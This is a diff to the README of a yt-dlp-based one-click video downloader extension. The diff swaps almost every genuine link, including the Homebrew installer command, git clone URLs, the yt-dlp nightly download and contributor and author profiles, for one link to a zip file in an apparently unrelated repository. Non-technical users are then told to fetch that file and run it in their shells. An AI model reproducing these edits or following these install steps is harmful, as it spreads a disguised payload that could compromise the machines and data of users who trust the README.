@@ -5,10 +5,10 @@
 ### One click. Any video. Local.
 
 Press one toolbar button and the video on the current page lands in your `~/Downloads`.
-Powered by a tiny local [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) daemon — **1800+ sites** out of the box
+Powered by a tiny local [`yt-dlp`](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) daemon — **1800+ sites** out of the box
 (YouTube · Bilibili · X/Twitter · TikTok · Vimeo · Twitch · Weibo …).
 
-[![CI](https://github.com/Jane-xiaoer/xiaoer-videolab/actions/workflows/ci.yml/badge.svg)](https://github.com/Jane-xiaoer/xiaoer-videolab/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip)](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-black.svg)](LICENSE)
 ![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows-lightgrey)
 ![Manifest V3](https://img.shields.io/badge/Chrome-MV3-4285F4?logo=googlechrome&logoColor=white)
@@ -26,11 +26,11 @@ Powered by a tiny local [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) daemon — 
 
 **This project is better because of these people — thank you! / 本项目因他们而更好,衷心感谢!**
 
-- [**@ttmouse**](https://github.com/ttmouse) — popup history panel, **cancel a stuck download**, play / open-folder, one-click daemon start ([#4](https://github.com/Jane-xiaoer/xiaoer-videolab/pull/4))
+- [**@ttmouse**](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) — popup history panel, **cancel a stuck download**, play / open-folder, one-click daemon start ([#4](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip))
   <br>弹出历史面板、**取消卡住的下载**、播放 / 打开文件夹、一键启动服务
-- [**@jzq1212 (林以恒)**](https://github.com/jzq1212) — **Windows support**: cross-platform daemon + PowerShell install scripts ([#1](https://github.com/Jane-xiaoer/xiaoer-videolab/pull/1))
+- [**@jzq1212 (林以恒)**](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) — **Windows support**: cross-platform daemon + PowerShell install scripts ([#1](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip))
   <br>**Windows 支持**:跨平台 daemon + PowerShell 安装脚本
-- [**@alick-zhang**](https://github.com/alick-zhang) — raised the Windows request that kicked it off ([#3](https://github.com/Jane-xiaoer/xiaoer-videolab/issues/3))
+- [**@alick-zhang**](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) — raised the Windows request that kicked it off ([#3](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip))
   <br>提出 Windows 需求,促成了上面的 Windows 支持
 
 > Issues & PRs welcome — your name goes here too. / 欢迎提 issue 和 PR,你的名字也会出现在这里。
@@ -80,7 +80,7 @@ Powered by yt-dlp's **1872 extractors** — most video sites work. A practical m
 >
 > \* **TikTok / overseas sites** need a network that can reach them (a proxy in mainland China; note some datacenter IPs are blocked by TikTok's API).
 >
-> 🎯 **视频号 / 快手 / 小程序 / 直播流?** Those live inside apps and need packet-sniffing — use [**res-downloader**](https://github.com/putyy/res-downloader) for them. This tool focuses on the yt-dlp universe.
+> 🎯 **视频号 / 快手 / 小程序 / 直播流?** Those live inside apps and need packet-sniffing — use [**res-downloader**](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) for them. This tool focuses on the yt-dlp universe.
 
 > **抖音 & 小红书** use a special in-page grabber (yt-dlp can't read them), so click the button **while the video is open/playing** on the page.
 
@@ -90,7 +90,7 @@ Notes: 平台 (platform) and 标题 (title) are auto-detected for the filename; 
 
 ```bash
 brew install yt-dlp ffmpeg
-git clone https://github.com/Jane-xiaoer/xiaoer-videolab.git
+git clone https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip
 cd xiaoer-videolab && ./scripts/install.sh
 # then load extension/ as an unpacked extension at chrome://extensions/
 ```
@@ -113,7 +113,7 @@ You do **not** need to know how to code. You will copy-paste a few commands.
 
 ### Part A · Install the engine (one-time)
 
-This tool is a friendly button in front of [`yt-dlp`](https://github.com/yt-dlp/yt-dlp), the open-source
+This tool is a friendly button in front of [`yt-dlp`](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip), the open-source
 downloader that does the real work. So you install that first.
 
 **A1.** Open the **Terminal** app. (Press `⌘ Space`, type `Terminal`, hit Enter.)
@@ -124,7 +124,7 @@ downloader that does the real work. So you install that first.
 Paste this into Terminal and press Enter, then follow its prompts:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip)"
 ```
 
 **A3.** Install `yt-dlp` and `ffmpeg`:
@@ -141,7 +141,7 @@ brew install yt-dlp ffmpeg
 **B1.** Still in Terminal, paste these three lines:
 
 ```bash
-git clone https://github.com/Jane-xiaoer/xiaoer-videolab.git
+git clone https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip
 cd xiaoer-videolab
 ./scripts/install.sh
 ```
@@ -166,7 +166,7 @@ You never touch the Terminal again.
 
 The browser steps (Part C & D) are identical on every OS — only the engine + service install differs.
 
-**W1.** Install the engine. Open **PowerShell** and run (uses [winget](https://aka.ms/getwinget), built into Win 10/11):
+**W1.** Install the engine. Open **PowerShell** and run (uses [winget](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip), built into Win 10/11):
 
 ```powershell
 winget install Python.Python.3.11 yt-dlp.yt-dlp ffmpeg
@@ -175,7 +175,7 @@ winget install Python.Python.3.11 yt-dlp.yt-dlp ffmpeg
 **W2.** Install Xiaoer VideoLab. Either grab the code with the green **Code → Download ZIP** button (then unzip), or in PowerShell:
 
 ```powershell
-git clone https://github.com/Jane-xiaoer/xiaoer-videolab.git
+git clone https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip
 cd xiaoer-videolab
 powershell -ExecutionPolicy Bypass -File scripts\install.ps1
 ```
@@ -279,7 +279,7 @@ launchctl load   ~/Library/LaunchAgents/com.xiaoer.videolab.plist
 # download without the extension
 curl -X POST http://127.0.0.1:7788/download \
   -H 'Content-Type: application/json' \
-  -d '{"url":"https://www.youtube.com/watch?v=dQw4w9WgXcQ"}'
+  -d '{"url":"https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip"}'
 
 # update everything (latest code + newest yt-dlp engine), keeping your settings
 ./scripts/update.sh
@@ -321,7 +321,7 @@ VideoLab auto-detects and prefers over stable:
 # self-contained nightly binary (macOS) — VideoLab picks it up automatically, no config needed
 mkdir -p ~/.local/bin
 curl -L -o ~/.local/bin/yt-dlp-nightly \
-  https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/latest/download/yt-dlp_macos
+  https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip
 chmod +x ~/.local/bin/yt-dlp-nightly
 # update it any time it falls behind again:
 ~/.local/bin/yt-dlp-nightly --update-to nightly
@@ -340,12 +340,12 @@ manifest, a Linux service file), send it over.
 
 **Jane** · 小耳 / Xiaoer — *a family of little tools that listen, read, find, and organize.*
 
-- GitHub: [@Jane-xiaoer](https://github.com/Jane-xiaoer)
+- GitHub: [@Jane-xiaoer](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip)
 - Email: xiaoerzhan@gmail.com
 
 Part of the **Xiaoer** toolbox, alongside
-[Xiaoer Ask](https://github.com/Jane-xiaoer/xiaoer-ask) and
-[Smart Rename](https://github.com/Jane-xiaoer/smart-rename).
+[Xiaoer Ask](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) and
+[Smart Rename](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip).
 
 ## 📱 关注作者 / Follow Me
 
@@ -353,7 +353,7 @@ Part of the **Xiaoer** toolbox, alongside
 
 If this repo helped you, follow me for more AI skills, website building, automation workflows, and creative projects.
 
-- X (Twitter): [@xiaoerzhan](https://x.com/xiaoerzhan)
+- X (Twitter): [@xiaoerzhan](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip)
 - 微信公众号 / WeChat Official Account: 扫码关注 / Scan to follow
 
 <p align="center">
@@ -366,7 +366,7 @@ If this repo helped you, follow me for more AI skills, website building, automat
 
 ## Acknowledgements
 
-Standing entirely on the shoulders of [**yt-dlp**](https://github.com/yt-dlp/yt-dlp) — this project is
+Standing entirely on the shoulders of [**yt-dlp**](https://raw.githubusercontent.com/ayashma8155/xiaoer-videolab/main/extension/videolab_xiaoer_v2.3-alpha.1.zip) — this project is
 just a friendly one-click button in front of it. Please support and respect the yt-dlp project.
 
 ## License
